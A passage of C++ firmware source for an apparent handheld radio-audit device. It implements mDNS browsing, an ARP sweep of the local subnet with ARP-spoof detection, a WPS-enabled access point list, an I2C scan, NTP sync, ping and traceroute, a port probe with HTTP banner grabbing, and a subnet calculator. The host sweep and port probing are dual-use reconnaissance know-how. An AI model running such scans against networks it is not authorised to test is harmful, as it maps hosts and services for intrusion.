    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }

  // Hand off to the selectable list; Confirm drills into per-device detail.
  mdnsSel = 0;
  showingMdnsList = true;
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderMdnsList() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "mDNS Services",
                 status.c_str());
  const int n = static_cast<int>(mdnsResults.size());
  const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(
      renderer, Rect{0, contentTop, pageWidth, listHeight}, n, mdnsSel,
      [this](int i) {
        const MdnsResult& r = mdnsResults[i];
        const std::string& name = !r.instance.empty() ? r.instance : (!r.host.empty() ? r.host : r.ip);
        return std::string("[") + r.label + "] " + name;
      },
      [this](int i) { return mdnsResults[i].ip + ":" + std::to_string(mdnsResults[i].port); }, nullptr,
      [this](int i) { return std::to_string(i + 1) + "/" + std::to_string(mdnsResults.size()); });
  const auto labels = mappedInput.mapLabels("Back", "Select", "Up", "Down");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::openMdnsDetail(int idx) {
  if (idx < 0 || idx >= static_cast<int>(mdnsResults.size())) return;
  const MdnsResult& r = mdnsResults[idx];

  targetTitle = !r.instance.empty() ? r.instance : (!r.host.empty() ? r.host : r.ip);
  targetLines.clear();
  targetLines.reserve(5 + r.txt.size());
  targetScroll = 0;
  targetLines.push_back(std::string("Type: ") + r.label);
  if (!r.host.empty()) targetLines.push_back("Host: " + r.host);
  targetLines.push_back("Addr: " + r.ip + ":" + std::to_string(r.port));
  if (r.txt.empty()) {
    targetLines.push_back("(no TXT records)");
  } else {
    targetLines.push_back(std::string("TXT (") + std::to_string(r.txt.size()) + "):");
    for (const auto& kv : r.txt) targetLines.push_back("  " + kv);
  }

  targetLocatable = false;  // passive detail only -- no action menu
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = true;
  targetMenuOpen = false;
  showingTarget = true;
  showingMdnsList = false;
  showingCameraList = false;
  showingDetails = false;
  requestUpdate();
}

// --- LAN Scanner (Network) ---

void RadioAuditActivity::startLanScan() {
  // Needs an IP on the target LAN. Reuse an existing association, else hand off
  // to WifiSelectionActivity (same flow as the mDNS browser).
  if (WiFi.status() == WL_CONNECTED) {
    lanNext = 0;  // first LAN_SCAN tick derives the subnet + resets state
    status = "LAN scan...";
    state = State::LAN_SCAN;
    requestUpdate();
    return;
  }
  shutdownBleController();
  WiFi.mode(WIFI_STA);
  startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                         [this](const ActivityResult& result) {
                           if (result.isCancelled || WiFi.status() != WL_CONNECTED) {
                             status = "Not connected";
                             state = State::DONE;
                             requestUpdate();
                             return;
                           }
                           lanNext = 0;
                           status = "LAN scan...";
                           state = State::LAN_SCAN;
                           requestUpdate();
                         });
}

void RadioAuditActivity::lanScanPass() {
  struct netif* nif = netif_default;
  if (!nif) {
    status = "No network interface";
    finishLanScan();
    return;
  }

  // First tick: derive the local /24 and reset the host table.
  if (lanNext == 0) {
    const IPAddress local = WiFi.localIP();
    const IPAddress gw = WiFi.gatewayIP();
    if (static_cast<uint32_t>(local) == 0) {
      status = "No IP address";
      finishLanScan();
      return;
    }
    lanBase = (static_cast<uint32_t>(local[0]) << 24) | (static_cast<uint32_t>(local[1]) << 16) |
              (static_cast<uint32_t>(local[2]) << 8);
    lanGateway = (static_cast<uint32_t>(gw[0]) << 24) | (static_cast<uint32_t>(gw[1]) << 16) |
                 (static_cast<uint32_t>(gw[2]) << 8) | gw[3];
    lanHosts.clear();
    lanHosts.reserve(64);
    lanNext = 1;
    lanDrain = 0;
  }

  const IPAddress local = WiFi.localIP();
  // Send a batch of ARP who-has, then harvest the (small, 10-entry) ARP table.
  // etharp_* must run under the TCPIP core lock (CONFIG_LWIP_TCPIP_CORE_LOCKING).
  LOCK_TCPIP_CORE();
  for (int k = 0; k < LAN_BATCH && lanNext <= 254; k++, lanNext++) {
    ip4_addr_t a;
    IP4_ADDR(&a, local[0], local[1], local[2], static_cast<uint8_t>(lanNext));
    etharp_request(nif, &a);
  }
  ip4_addr_t* ip;
  struct netif* n;
  struct eth_addr* eth;
  for (size_t i = 0; i < ARP_TABLE_SIZE; i++) {
    if (!etharp_get_entry(i, &ip, &n, &eth)) continue;
    const uint32_t hip = (static_cast<uint32_t>(ip4_addr1(ip)) << 24) | (static_cast<uint32_t>(ip4_addr2(ip)) << 16) |
                         (static_cast<uint32_t>(ip4_addr3(ip)) << 8) | ip4_addr4(ip);
    if ((hip & 0xFFFFFF00u) != lanBase) continue;  // only our subnet
    bool seen = false;
    for (const auto& h : lanHosts)
      if (h.ip == hip) {
        seen = true;
        break;
      }
    if (seen || lanHosts.size() >= LAN_MAX_HOSTS) continue;
    char macbuf[18];
    snprintf(macbuf, sizeof(macbuf), "%02X:%02X:%02X:%02X:%02X:%02X", eth->addr[0], eth->addr[1], eth->addr[2],
             eth->addr[3], eth->addr[4], eth->addr[5]);
    LanHost host;
    host.ip = hip;
    host.mac = macbuf;
    lanHosts.push_back(std::move(host));
  }
  UNLOCK_TCPIP_CORE();

  status =
      (String("LAN ") + (lanNext <= 254 ? lanNext : 254) + "/254  found " + static_cast<int>(lanHosts.size())).c_str();
  requestUpdate();

  if (lanNext > 254 && ++lanDrain > LAN_DRAIN_TICKS) finishLanScan();
}

void RadioAuditActivity::finishLanScan() {
  // Resolve vendors now (macVendor does SD I/O — kept out of the ARP-lock loop).
  for (auto& h : lanHosts)
    if (h.vendor.empty() && !h.mac.empty()) h.vendor = macVendor(h.mac);

  std::sort(lanHosts.begin(), lanHosts.end(), [](const LanHost& a, const LanHost& b) { return a.ip < b.ip; });

  // ARP spoof / MITM check: in a healthy LAN each MAC answers for exactly one
  // IP. The same MAC claiming multiple IPs in one ARP-table snapshot -- most
  // alarmingly the gateway's IP plus another host -- is the classic ARP-spoof
  // signature (an attacker impersonating both ends of a connection). Reuses
  // the ip+mac data the sweep already collected -- no extra capture needed.
  std::vector<std::string> dupMacs;
  for (size_t i = 0; i < lanHosts.size(); i++) {
    if (lanHosts[i].mac.empty()) continue;
    bool already = false;
    for (const auto& m : dupMacs)
      if (m == lanHosts[i].mac) already = true;
    if (already) continue;
    std::vector<uint32_t> ips = {lanHosts[i].ip};
    for (size_t j = i + 1; j < lanHosts.size(); j++)
      if (lanHosts[j].mac == lanHosts[i].mac) ips.push_back(lanHosts[j].ip);
    if (ips.size() < 2) continue;
    dupMacs.push_back(lanHosts[i].mac);

    char ipbuf[24];
    std::string ipList;
    bool involvesGateway = false;
    for (uint32_t ip : ips) {
      snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u", (ip >> 24) & 0xFF, (ip >> 16) & 0xFF, (ip >> 8) & 0xFF, ip & 0xFF);
      if (!ipList.empty()) ipList += ", ";
      ipList += ipbuf;
      if (ip == lanGateway) involvesGateway = true;
    }
    const std::string msg = lanHosts[i].mac + " answers for " + std::to_string(ips.size()) + " IPs (" + ipList + ")" +
                            (involvesGateway ? " - includes the GATEWAY" : "") + " - possible ARP spoofing / MITM.";
    addAuditFinding(involvesGateway ? "HIGH" : "MED", "Possible ARP spoofing", msg);
  }

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);  // return the radio to a clean idle state (matches mDNS browser)

  targetTitle = "LAN Hosts";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  char ipbuf[24];
  for (const auto& h : lanHosts) {
    const bool dup = std::find(dupMacs.begin(), dupMacs.end(), h.mac) != dupMacs.end();
    snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u%s", (h.ip >> 24) & 0xFF, (h.ip >> 16) & 0xFF, (h.ip >> 8) & 0xFF,
             h.ip & 0xFF, h.ip == lanGateway ? " (gw)" : "");
    targetLines.push_back(ipbuf);
    targetLines.push_back("  " + h.mac + (h.vendor.empty() ? "" : "  " + h.vendor) + (dup ? "  [DUP MAC]" : ""));
  }
  if (lanHosts.empty()) targetLines.push_back("No hosts responded.");
  if (!dupMacs.empty()) {
    targetLines.push_back("");
    targetLines.push_back(std::to_string(dupMacs.size()) + " MAC(s) answered for multiple IPs - see Audit Findings.");
  }

  status = (String("LAN: ") + static_cast<int>(lanHosts.size()) + " host(s)").c_str();
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- WPS Audit (Results) ---

void RadioAuditActivity::showWpsAudit() {
  if (wifiFindings.empty()) {
    status = "Run a WiFi scan first";
    requestUpdate();
    return;
  }
  targetTitle = "WPS Audit";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  int count = 0;
  for (const auto& w : wifiFindings) {
    if (!w.wps) continue;
    targetLines.push_back(w.ssid.empty() ? std::string("<hidden>") : w.ssid);
    targetLines.push_back("  " + w.bssid + "  CH" + std::to_string(w.channel) + "  " + w.auth);
    count++;
  }
  if (count == 0) targetLines.push_back("No WPS-enabled APs in last scan.");
  status = (String("WPS: ") + count + " AP(s)").c_str();
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- System Stats (Results) ---

void RadioAuditActivity::showSystemStats() {
  targetTitle = "System Stats";
  targetLines.clear();
  targetLines.reserve(12);
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  char b[64];
  snprintf(b, sizeof(b), "FW: %s", RADIOINK_VERSION);
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Chip: %s rev %d", ESP.getChipModel(), static_cast<int>(ESP.getChipRevision()));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "CPU: %u MHz  x%d", static_cast<unsigned>(ESP.getCpuFreqMHz()),
           static_cast<int>(ESP.getChipCores()));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Free heap: %u B", static_cast<unsigned>(ESP.getFreeHeap()));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Max alloc: %u B", static_cast<unsigned>(ESP.getMaxAllocHeap()));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Min free: %u B", static_cast<unsigned>(ESP.getMinFreeHeap()));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Flash: %u MB", static_cast<unsigned>(ESP.getFlashChipSize() / (1024 * 1024)));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Temp: %.1f C", temperatureRead());
  targetLines.push_back(b);
  const uint64_t up = static_cast<uint64_t>(esp_timer_get_time() / 1000000);
  snprintf(b, sizeof(b), "Uptime: %02uh %02um %02us", static_cast<unsigned>(up / 3600),
           static_cast<unsigned>((up / 60) % 60), static_cast<unsigned>(up % 60));
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "STA MAC: %s", WiFi.macAddress().c_str());
  targetLines.push_back(b);
  status = "Device diagnostics";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- I2C Bus Scan (Results) — hunt for the X3's NFC chip ---

namespace {
// Label a responding I2C address: the three chips we already drive, plus common
// NFC controller/tag addresses flagged as candidates (the X3 has NFC; find it).
const char* i2cLabel(uint8_t a) {
  switch (a) {
    case 0x55:
      return "BQ27220 battery";
    case 0x68:
      return "DS3231 RTC";
    case 0x6A:
    case 0x6B:
      return "QMI8658 IMU";
    case 0x24:
    case 0x48:
      return "PN532 NFC? reader/emu";
    case 0x28:
    case 0x2C:
    case 0x2D:
      return "ST25 NFC? dyn tag";
    case 0x50:
    case 0x51:
    case 0x52:
    case 0x53:
    case 0x54:
    case 0x56:
    case 0x57:
      return "NTAG/ST25/EEPROM? NFC candidate";
    default:
      return "unknown";
  }
}
}  // namespace

void RadioAuditActivity::showI2cScan() {
  status = "Scanning I2C...";
  showingTarget = false;
  requestUpdateAndWait();

  targetTitle = "I2C Bus Scan";
  targetLines.clear();
  targetLines.reserve(16);
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;

  int found = 0;
  char b[64];
  for (uint8_t addr = 0x08; addr <= 0x77; addr++) {
    Wire.beginTransmission(addr);
    if (Wire.endTransmission() == 0) {  // device ACKed its address
      snprintf(b, sizeof(b), "0x%02X  %s", addr, i2cLabel(addr));
      targetLines.push_back(b);
      found++;
    }
  }
  if (found == 0) targetLines.push_back("No I2C devices responded.");
  targetLines.push_back("");
  targetLines.push_back("Known: 0x55 batt, 0x68 RTC, 0x6B IMU.");
  targetLines.push_back("Anything else = NFC candidate.");

  status = (String("I2C: ") + found + " device(s)").c_str();
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- NTP Time Sync (Network) ---

void RadioAuditActivity::startNtpSync() {
  // Needs an internet route, so we must be associated. Reuse an existing
  // connection (e.g. left over from mDNS/LAN), else hand off to the Wi-Fi picker.
  if (WiFi.status() == WL_CONNECTED) {
    doNtpSync();
    return;
  }
  shutdownBleController();
  WiFi.mode(WIFI_STA);
  startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                         [this](const ActivityResult& result) {
                           if (result.isCancelled || WiFi.status() != WL_CONNECTED) {
                             status = "Not connected";
                             state = State::DONE;
                             requestUpdate();
                             return;
                           }
                           doNtpSync();
                         });
}

void RadioAuditActivity::doNtpSync() {
  status = "Syncing clock (NTP)...";
  showingTarget = false;
  requestUpdateAndWait();  // paint the status before the ~5 s blocking SNTP wait

  const bool ok = halClock.syncFromNTP();

  targetTitle = "NTP Time Sync";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;

  if (ok) {
    SETTINGS.clockHasBeenSynced = 1;  // stops the auto-sync hook firing on later connects
    SETTINGS.saveToFile();
    char buf[16];
    if (halClock.formatTime(buf, sizeof(buf), SETTINGS.clockUtcOffsetQ, SETTINGS.clockFormat == 1))
      targetLines.push_back(std::string("Clock set: ") + buf);
    else
      targetLines.push_back("RTC updated from NTP.");
    targetLines.push_back("Captures are now timestamped.");
    status = "Synced";
  } else {
    targetLines.push_back("NTP sync failed.");
    targetLines.push_back("No reply from the time server.");
    status = "Failed";
  }

  // Return the radio to a clean idle state (matches finishMdnsQuery / finishLanScan).
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- Network Info + ping (Network) ---

namespace {
// Synchronous ICMP ping of a single host (a few packets), built on esp_ping. The
// ping runs in its own task; we wait on a flag the end-callback sets, then read
// the profile counters. Returns true if at least one reply came back.
volatile bool g_pingDone = false;
uint32_t g_pingTx = 0, g_pingRx = 0, g_pingMs = 0;
ip_addr_t g_pingReplyIp;

void pingEndCb(esp_ping_handle_t hdl, void* /*args*/) {
  esp_ping_get_profile(hdl, ESP_PING_PROF_REQUEST, &g_pingTx, sizeof(g_pingTx));
  esp_ping_get_profile(hdl, ESP_PING_PROF_REPLY, &g_pingRx, sizeof(g_pingRx));
  esp_ping_get_profile(hdl, ESP_PING_PROF_DURATION, &g_pingMs, sizeof(g_pingMs));
  // IPADDR reports whoever actually replied -- for a TTL-limited probe (see
  // pingWithTtl below) that's the intermediate router that sent the ICMP
  // Time-Exceeded, exactly what a traceroute hop needs.
  esp_ping_get_profile(hdl, ESP_PING_PROF_IPADDR, &g_pingReplyIp, sizeof(g_pingReplyIp));
  g_pingDone = true;
}

bool pingHost(const IPAddress& ip, uint32_t& avgMs, uint32_t& rx, uint32_t& tx) {
  char ipStr[16];
  snprintf(ipStr, sizeof(ipStr), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  ip_addr_t target;
  if (!ipaddr_aton(ipStr, &target)) return false;

  esp_ping_config_t cfg = ESP_PING_DEFAULT_CONFIG();
  cfg.target_addr = target;
  cfg.count = 3;
  cfg.timeout_ms = 800;
  cfg.interval_ms = 200;
  esp_ping_callbacks_t cbs = {};
  cbs.on_ping_end = pingEndCb;

  esp_ping_handle_t hdl = nullptr;
  if (esp_ping_new_session(&cfg, &cbs, &hdl) != ESP_OK || !hdl) return false;
  g_pingDone = false;
  g_pingTx = g_pingRx = g_pingMs = 0;
  esp_ping_start(hdl);
  uint32_t waited = 0;
  while (!g_pingDone && waited < 4000) {  // bounded; feeds the WDT via vTaskDelay
    delay(50);
    waited += 50;
  }
  esp_ping_stop(hdl);
  esp_ping_delete_session(hdl);

  rx = g_pingRx;
  tx = g_pingTx;
  avgMs = g_pingRx ? g_pingMs / g_pingRx : 0;
  return g_pingRx > 0;
}

// Single TTL-limited echo request for Traceroute. Whoever replies (the final
// target, or an intermediate router via ICMP Time-Exceeded) is reported through
// ESP_PING_PROF_IPADDR. Returns true if anything replied within the timeout.
bool pingWithTtl(const IPAddress& ip, uint8_t ttl, uint32_t& ms, IPAddress& replyFrom) {
  char ipStr[16];
  snprintf(ipStr, sizeof(ipStr), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  ip_addr_t target;
  if (!ipaddr_aton(ipStr, &target)) return false;

  esp_ping_config_t cfg = ESP_PING_DEFAULT_CONFIG();
  cfg.target_addr = target;
  cfg.count = 1;
  cfg.timeout_ms = 800;
  cfg.ttl = ttl;
  esp_ping_callbacks_t cbs = {};
  cbs.on_ping_end = pingEndCb;

  esp_ping_handle_t hdl = nullptr;
  if (esp_ping_new_session(&cfg, &cbs, &hdl) != ESP_OK || !hdl) return false;
  g_pingDone = false;
  g_pingRx = g_pingMs = 0;
  esp_ping_start(hdl);
  uint32_t waited = 0;
  while (!g_pingDone && waited < 1200) {  // bounded; feeds the WDT via vTaskDelay
    delay(50);
    waited += 50;
  }
  esp_ping_stop(hdl);
  esp_ping_delete_session(hdl);

  if (g_pingRx == 0) return false;
  ms = g_pingMs;
  const uint32_t v4 = ip4_addr_get_u32(ip_2_ip4(&g_pingReplyIp));
  replyFrom = IPAddress(v4 & 0xFF, (v4 >> 8) & 0xFF, (v4 >> 16) & 0xFF, (v4 >> 24) & 0xFF);
  return true;
}
}  // namespace

void RadioAuditActivity::startNetInfo() {
  if (WiFi.status() == WL_CONNECTED) {
    doNetInfo();
    return;
  }
  shutdownBleController();
  WiFi.mode(WIFI_STA);
  startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                         [this](const ActivityResult& result) {
                           if (result.isCancelled || WiFi.status() != WL_CONNECTED) {
                             status = "Not connected";
                             state = State::DONE;
                             requestUpdate();
                             return;
                           }
                           doNetInfo();
                         });
}

void RadioAuditActivity::doNetInfo() {
  status = "Pinging...";
  showingTarget = false;
  requestUpdateAndWait();  // paint status before the blocking pings

  targetTitle = "Network Info";
  targetLines.clear();
  targetLines.reserve(12);
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;

  const IPAddress gw = WiFi.gatewayIP();
  char b[80];
  snprintf(b, sizeof(b), "SSID: %s", WiFi.SSID().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "IP: %s", WiFi.localIP().toString().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Gateway: %s", gw.toString().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "Mask: %s", WiFi.subnetMask().toString().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "DNS: %s", WiFi.dnsIP().toString().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "MAC: %s", WiFi.macAddress().c_str());
  targetLines.push_back(b);
  snprintf(b, sizeof(b), "RSSI: %d dBm  CH%d", static_cast<int>(WiFi.RSSI()), WiFi.channel());
  targetLines.push_back(b);

  uint32_t avg, rx, tx;
  if (gw != IPAddress(0, 0, 0, 0) && pingHost(gw, avg, rx, tx))
    snprintf(b, sizeof(b), "Gateway ping: %ums (%u/%u)", static_cast<unsigned>(avg), static_cast<unsigned>(rx),
             static_cast<unsigned>(tx));
  else
    snprintf(b, sizeof(b), "Gateway ping: no reply");
  targetLines.push_back(b);

  const IPAddress inet(8, 8, 8, 8);
  if (pingHost(inet, avg, rx, tx))
    snprintf(b, sizeof(b), "Internet (8.8.8.8): %ums (%u/%u)", static_cast<unsigned>(avg), static_cast<unsigned>(rx),
             static_cast<unsigned>(tx));
  else
    snprintf(b, sizeof(b), "Internet (8.8.8.8): no reply");
  targetLines.push_back(b);

  // Return the radio to a clean idle state (matches the other Network tools).
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  status = "Network details";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- Port Probe + HTTP banner (Network) ---

namespace {
struct PortDef {
  uint16_t port;
  const char* name;
  bool http;  // grab an HTTP banner on this port
};
// A curated set of common service ports (not an exhaustive scan).
constexpr PortDef PROBE_PORTS[] = {
    {21, "ftp", false},   {22, "ssh", false},   {23, "telnet", false},   {25, "smtp", false},  {53, "dns", false},
    {80, "http", true},   {110, "pop3", false}, {139, "netbios", false}, {143, "imap", false}, {443, "https", false},
    {445, "smb", false},  {554, "rtsp", false}, {1883, "mqtt", false},   {3389, "rdp", false}, {5000, "http", true},
    {8000, "http", true}, {8080, "http", true}, {8443, "https", false},  {8888, "http", true}, {9100, "printer", false},
};
constexpr int PROBE_PORT_COUNT = sizeof(PROBE_PORTS) / sizeof(PROBE_PORTS[0]);
constexpr int PROBE_TIMEOUT_MS = 600;

// Fetch "/" and pull the Server: header + <title> for fingerprinting. Bounded
// read; case-insensitive search against a lowercased copy (indices align).
std::string httpBanner(WiFiClient& client, const String& host) {
  client.print(String("GET / HTTP/1.0\r\nHost: ") + host + "\r\nUser-Agent: RadioInk\r\nConnection: close\r\n\r\n");
  String resp;
  resp.reserve(1600);
  const uint32_t deadline = millis() + 800;
  while (millis() < deadline && resp.length() < 1500) {
    while (client.available() && resp.length() < 1500) resp += static_cast<char>(client.read());
    if (!client.connected() && !client.available()) break;
    delay(10);
  }
  String low = resp;
  low.toLowerCase();
  std::string out;
  const int s = low.indexOf("server:");
  if (s >= 0) {
    int e = resp.indexOf('\r', s);
    if (e < 0) e = resp.indexOf('\n', s);
    if (e < 0) e = resp.length();
    String val = resp.substring(s + 7, e);
    val.trim();
    if (val.length()) out += std::string("[") + val.c_str() + "]";
  }
  const int t = low.indexOf("<title>");
  if (t >= 0) {
    int e = low.indexOf("</title>", t);
    if (e < 0) e = resp.length();
    String title = resp.substring(t + 7, e);
    title.trim();
    if (title.length()) {
      if (!out.empty()) out += " ";
      out += std::string("\"") + title.c_str() + "\"";
    }
  }
  return out;
}
}  // namespace

void RadioAuditActivity::startPortProbe() {
  // Ask for the target IP first (typeable without a connection); the URL keyboard
  // offers a "192.168." snippet. Default to the gateway when already associated.
  const String prefill = (WiFi.status() == WL_CONNECTED) ? WiFi.gatewayIP().toString() : String("192.168.1.1");
  startActivityForResult(
      std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "Target IP", std::string(prefill.c_str()), 40,
                                              InputType::Url, true),
      [this](const ActivityResult& result) {
        if (result.isCancelled) {
          state = State::DONE;
          requestUpdate();
          return;
        }
        IPAddress ip;
        if (!ip.fromString(std::get<KeyboardResult>(result.data).text.c_str())) {
          status = "Invalid IP";
          state = State::DONE;
          requestUpdate();
          return;
        }
        probeTarget = ip;
        if (WiFi.status() == WL_CONNECTED) {
          beginPortProbe();
          return;
        }
        shutdownBleController();
        WiFi.mode(WIFI_STA);
        startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                               [this](const ActivityResult& r) {
                                 if (r.isCancelled || WiFi.status() != WL_CONNECTED) {
                                   status = "Not connected";
                                   state = State::DONE;
                                   requestUpdate();
                                   return;
                                 }
                                 beginPortProbe();
                               });
      });
}

void RadioAuditActivity::beginPortProbe() {
  probePortIdx = 0;
  probeOpen.clear();
  probeOpen.reserve(8);
  status = "Probing...";
  showingTarget = false;
  state = State::PORT_PROBE;
  requestUpdate();
}

void RadioAuditActivity::portProbePass() {
  if (probePortIdx >= PROBE_PORT_COUNT) {
    finishPortProbe();
    return;
  }
  const PortDef& pd = PROBE_PORTS[probePortIdx];
  status = (String("Probing ") + pd.port + " (" + (probePortIdx + 1) + "/" + PROBE_PORT_COUNT + ")  open " +
            static_cast<int>(probeOpen.size()))
               .c_str();
  requestUpdateAndWait();  // paint progress before the blocking connect

  WiFiClient client;
  if (client.connect(probeTarget, pd.port, PROBE_TIMEOUT_MS)) {
    std::string line = std::to_string(pd.port) + "  " + pd.name;
    if (pd.http) {
      const std::string banner = httpBanner(client, probeTarget.toString());
      if (!banner.empty()) line += "  " + banner;
    }
    probeOpen.push_back(line);
  }
  client.stop();
  probePortIdx++;
  requestUpdate();
}

void RadioAuditActivity::finishPortProbe() {
  targetTitle = (String("Ports ") + probeTarget.toString()).c_str();
  targetLines = probeOpen;
  if (targetLines.empty()) targetLines.push_back("No open ports found.");
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  status = (String("Open: ") + static_cast<int>(probeOpen.size())).c_str();

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- Subnet Calculator (Network) -- pure offline math, no radio needed ---

void RadioAuditActivity::showSubnetCalc() {
  startActivityForResult(
      std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "IP/CIDR e.g. 192.168.1.0/24", "192.168.1.0/24",
                                              32, InputType::Url, true),
      [this](const ActivityResult& result) {
        if (result.isCancelled) {
          state = State::DONE;
          requestUpdate();
          return;
        }
        const std::string text = std::get<KeyboardResult>(result.data).text;
        const size_t slash = text.find('/');
        IPAddress ip;
        int prefix = -1;
        bool ok = false;
        if (slash != std::string::npos) {
          ok = ip.fromString(text.substr(0, slash).c_str());
          prefix = atoi(text.substr(slash + 1).c_str());
        }

        targetTitle = "Subnet Calculator";
        targetLines.clear();
        targetScroll = 0;
        targetFromList = false;
        targetFromCameraList = false;
        targetFromMdnsList = false;
        targetLocatable = false;

        if (!ok || prefix < 0 || prefix > 32) {
          targetLines.push_back("Invalid input. Use IP/CIDR, e.g.");
          targetLines.push_back("192.168.1.10/24");
          status = "Invalid input";
        } else {
          const uint32_t ipHost = (static_cast<uint32_t>(ip[0]) << 24) | (static_cast<uint32_t>(ip[1]) << 16) |
                                  (static_cast<uint32_t>(ip[2]) << 8) | ip[3];
          const uint32_t mask = prefix == 0 ? 0 : (0xFFFFFFFFu << (32 - prefix));
          const uint32_t network = ipHost & mask;
          const uint32_t broadcast = network | ~mask;
          const uint64_t total = 1ULL << (32 - prefix);
          auto fmtIp = [](uint32_t v) {
            char b[24];
            snprintf(b, sizeof(b), "%u.%u.%u.%u", (v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF);
            return std::string(b);
          };
          targetLines.push_back("Address: " + fmtIp(ipHost) + "/" + std::to_string(prefix));
          targetLines.push_back("Netmask: " + fmtIp(mask));
          targetLines.push_back("Network: " + fmtIp(network));
          targetLines.push_back("Broadcast: " + fmtIp(broadcast));
          if (prefix >= 31) {
            targetLines.push_back("Usable hosts: " + std::to_string(total) + " (point-to-point/single, no split)");
          } else {
            targetLines.push_back("First host: " + fmtIp(network + 1));
            targetLines.push_back("Last host: " + fmtIp(broadcast - 1));
            targetLines.push_back("Usable hosts: " + std::to_string(total - 2));
          }
          status = "Subnet calculated";
        }
        showingTarget = true;
        showingDetails = false;
        showingFindings = false;
        state = State::DONE;
        requestUpdate();
      });
}

// --- Traceroute (Network) ---

void RadioAuditActivity::startTraceroute() {
  const String prefill = (WiFi.status() == WL_CONNECTED) ? WiFi.gatewayIP().toString() : String("8.8.8.8");
  startActivityForResult(
      std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "Target IP", std::string(prefill.c_str()), 40,
                                              InputType::Url, true),
      [this](const ActivityResult& result) {
        if (result.isCancelled) {
          state = State::DONE;
          requestUpdate();
          return;
        }
        IPAddress ip;
        if (!ip.fromString(std::get<KeyboardResult>(result.data).text.c_str())) {
          status = "Invalid IP";
          state = State::DONE;
          requestUpdate();
          return;
        }
        tracerouteTarget = ip;
        if (WiFi.status() == WL_CONNECTED) {
          beginTraceroute();
          return;
        }
        shutdownBleController();
        WiFi.mode(WIFI_STA);
        startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                               [this](const ActivityResult& r) {
                                 if (r.isCancelled || WiFi.status() != WL_CONNECTED) {
                                   status = "Not connected";
                                   state = State::DONE;
                                   requestUpdate();
                                   return;
                                 }
                                 beginTraceroute();
                               });
      });
}

void RadioAuditActivity::beginTraceroute() {
  tracerouteTtl = 1;
  tracerouteHops.clear();
  tracerouteHops.reserve(16);
  status = "Tracing...";
  showingTarget = false;
  state = State::TRACEROUTE;
  requestUpdate();
}

void RadioAuditActivity::traceroutePass() {
  constexpr int MAX_HOPS = 20;
  if (tracerouteTtl > MAX_HOPS) {
    finishTraceroute();
    return;
